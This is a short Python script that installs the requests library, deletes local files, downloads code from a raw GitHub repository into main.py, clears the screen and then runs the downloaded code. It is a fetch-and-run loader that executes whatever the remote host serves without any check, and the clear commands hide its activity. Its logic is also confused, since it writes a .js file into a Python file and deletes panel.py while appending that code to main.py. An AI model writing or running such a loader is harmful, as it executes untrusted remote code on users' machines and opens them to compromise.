import os
os.system("pip3 install requests")
import requests
import random
import time

os.system("rm main.py")
rand = open('main.py', 'a+', encoding='utf-8')
ran = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/rand.js").text
rand.write(ran)
os.system("clear")
os.system("rm panel.py")
pane = open('main.py', 'a+', encoding='utf-8')
pan = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/panel.py").text
pane.write(pan)
os.system("clear")
os.system("python main.py")